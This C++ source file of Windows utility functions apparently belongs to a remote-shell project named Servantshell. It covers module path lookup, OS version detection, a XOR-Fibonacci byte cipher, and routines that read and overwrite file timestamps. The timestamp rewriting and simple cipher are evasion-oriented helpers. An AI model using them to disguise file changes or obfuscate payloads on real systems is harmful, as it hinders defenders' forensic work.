#include "stdafx.h"
#include "file/MyFile.h"
#include "BinNames.h"
#include "common.h"

static tstring g_binFilepath;
static tstring g_binFilename;

static void GetModFilePath(HMODULE hMod, tstring& binFilePath, tstring& filename)
{
	TCHAR baseName[MAX_PATH] = {0};
	DWORD dwBaseNameSize = GetModuleFileName(hMod, baseName, MAX_PATH);
	while (dwBaseNameSize > 0 && baseName[dwBaseNameSize] != '\\')
	{
		dwBaseNameSize--;
	}
	baseName[dwBaseNameSize] = '\0';
	binFilePath = baseName;
	binFilePath += '\\';
	filename = &baseName[dwBaseNameSize + 1];
}

LPCTSTR GetBinFilepath()
{
	if (g_binFilepath.size() > 0)
	{
		return g_binFilepath.c_str();
	}

	GetModFilePath(g_hServantshell, g_binFilepath, g_binFilename);

	return g_binFilepath.c_str();
}

LPCTSTR GetBinFilename()
{
	if (g_binFilename.size() > 0)
	{
		return g_binFilename.c_str();
	}

	GetModFilePath(g_hServantshell, g_binFilepath, g_binFilename);

	return g_binFilename.c_str();
}

void XorFibonacciCrypt(const LPVOID lpPlain, DWORD dwPlainLen, LPVOID lpEncrypted, UINT factor0, UINT factor1)
{
	LPBYTE lpOutput = (LPBYTE) lpEncrypted;
	LPBYTE lpSource = (LPBYTE) lpPlain;

	UINT last1 = factor1;
	UINT last2 = factor0;

	for (DWORD i = 0; i < dwPlainLen; i++)
	{
		BYTE xorchar = (last1 + last2) % MAXBYTE;
		last2 = last1;
		last1 = xorchar;

		*lpOutput = (*lpSource) ^ xorchar;
		lpOutput++;
		lpSource++;
	}
}

WIN_VER_DETAIL GetWindowsVersion()
{
	static WIN_VER_DETAIL osversion = WINDOWS_VERSION_NONE; 

	if (osversion != WINDOWS_VERSION_NONE) return osversion;

	OSVERSIONINFOEX osvi = {0};
	BOOL bOsVersionInfoEx;

	//先尝试GetVersionEx使用OSVERSIONINFOEX结构
	//如果失败，就尝试使用OSVERSIONINFO结构
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	if(! (bOsVersionInfoEx = GetVersionEx((OSVERSIONINFO*) &osvi)))
	{
		osvi.dwOSVersionInfoSize = sizeof (OSVERSIONINFO);
		if (! GetVersionEx((OSVERSIONINFO *) &osvi)) 
		{
			osversion = WINDOWS_VERSION_NONE;
			return osversion;
		}
	}

	SYSTEM_INFO si;
	ZeroMemory(&si, sizeof(SYSTEM_INFO));
	GetSystemInfo(&si);

	switch (osvi.dwPlatformId)
	{
		//测试是否是 Windows NT 产品家族
	case VER_PLATFORM_WIN32_NT:
		//监测具体的产品
		if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 0)
		{
			if(osvi.wProductType == VER_NT_WORKSTATION)
			{
				osversion = WINDOWS_VERSION_VISTA;
			}
			else
			{
				osversion = WINDOWS_VERSION_2K8;
			}
		}
		else if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 1)
		{
			if (osvi.wProductType == VER_NT_WORKSTATION)
			{
				osversion = WINDOWS_VERSION_7;
			}
			else
			{
				osversion = WINDOWS_VERSION_2K8;
			}
		}
		else if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 2)
		{
			if (osvi.wProductType == VER_NT_WORKSTATION)
			{
				osversion = WINDOWS_VERSION_8;
			}
			else
			{
				osversion = WINDOWS_VERSION_2012;
			}
		}
		else if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 2)
		{
			if( GetSystemMetrics(SM_SERVERR2) )
			{
				osversion = WINDOWS_VERSION_2K3_SP1_SP2;
			}
			else if( osvi.wProductType == VER_NT_WORKSTATION && 
				si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
			{
				//osversion = OSVERSION_XPP_X64;
				osversion = WINDOWS_VERSION_XP;
			}
			else
			{
				osversion = WINDOWS_VERSION_2K3;
			}
		}
		else if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 1)
		{
			osversion = WINDOWS_VERSION_XP;
		}

		if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 0)
		{
			osversion = WINDOWS_VERSION_2K;
		}
		if ( osvi.dwMajorVersion <= 4 )
		{
			osversion = WINDOWS_VERSION_NT;
		}
		break;

		//测试是否是Windows Me/98/95.
	case VER_PLATFORM_WIN32_WINDOWS:
		if (osvi.dwMajorVersion == 4 && osvi.dwMinorVersion == 0)
		{
			if (osvi.szCSDVersion[1]=='C' || osvi.szCSDVersion[1]=='B')
			{
				osversion = WINDOWS_VERSION_95_OSR2;
			}
			else
			{
				osversion = WINDOWS_VERSION_95;
			}
		} 
		else if (osvi.dwMajorVersion == 4 && osvi.dwMinorVersion == 10)
		{
			if ( osvi.szCSDVersion[1]=='A' || osvi.szCSDVersion[1]=='B')
			{
				osversion = WINDOWS_VERSION_98_SE;
			}
			else
			{
				osversion = WINDOWS_VERSION_98;
			}
		} 
		else if (osvi.dwMajorVersion == 4 && osvi.dwMinorVersion == 90)
		{
			osversion = WINDOWS_VERSION_ME;
		} 
		break;
	case VER_PLATFORM_WIN32s:
		//result += _T("Microsoft Win32s");
		osversion = WINDOWS_VERSION_NONE;
		break;
	}

	return osversion; 
}

BOOL IsWow64()
{
	BOOL bIsWow64 = FALSE;

	typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
	LPFN_ISWOW64PROCESS fnIsWow64Process;

	fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(
		GetModuleHandle(TEXT("kernel32")),"IsWow64Process");

	if (NULL != fnIsWow64Process)
	{
		if (! fnIsWow64Process(GetCurrentProcess(), &bIsWow64))
		{
			errorLogE(_T("IsWow64Process failed."));
		}
	}

	return bIsWow64;
}

BOOL GetFileTimes( LPCTSTR filepath, BOOL bIsDir, FILETIME& ftCreationTime, FILETIME& ftLastAccessTime, FILETIME& ftLastWriteTime )
{
	ZeroMemory(&ftCreationTime, sizeof(FILETIME));
	ZeroMemory(&ftLastAccessTime, sizeof(FILETIME));
	ZeroMemory(&ftLastWriteTime, sizeof(FILETIME));

	//获取所在目录的时间属性
	MyFile targetDir;
	if (! targetDir.Open(filepath, GENERIC_READ, OPEN_EXISTING, FILE_SHARE_READ, (bIsDir ? FILE_FLAG_BACKUP_SEMANTICS : FILE_ATTRIBUTE_NORMAL)))
	{
		errorLogE(_T("open file[%s] failed."), filepath);
		return FALSE;
	}
		
	if (! ::GetFileTime(targetDir, &ftCreationTime, &ftLastAccessTime, &ftLastWriteTime))
	{
		errorLogE(_T("Get targetdir times failed[%s]."), filepath);
		return FALSE;
	}

	return TRUE;
}

BOOL SetFileTimes(LPCTSTR filepath, BOOL bIsDir, const FILETIME& ftCreationTime, const FILETIME& ftLastAccessTime, const FILETIME& ftLastWriteTime)
{
	if (ftCreationTime.dwLowDateTime == 0 || ftLastAccessTime.dwLowDateTime == 0 || ftLastWriteTime.dwLowDateTime == 0)
	{
		errorLog(_T("invalid time for [%s][%u][%u][%u]"), filepath, ftCreationTime.dwLowDateTime, ftLastAccessTime.dwLowDateTime, ftLastWriteTime.dwLowDateTime);
		return FALSE;
	}

	MyFile target;
	if (! target.Open(filepath, FILE_WRITE_ATTRIBUTES, OPEN_EXISTING, FILE_SHARE_WRITE, (bIsDir ? FILE_FLAG_BACKUP_SEMANTICS : FILE_ATTRIBUTE_NORMAL)))
	{
		errorLogE(_T("create target file[%s] for adjust time failed."), filepath);
		return FALSE;
	}

	if (! ::SetFileTime(target, &ftCreationTime, &ftLastAccessTime, &ftLastWriteTime))
	{
		errorLogE(_T("SetFileTime[%s] failed."), filepath);
		return FALSE;
	}

	return TRUE;
}
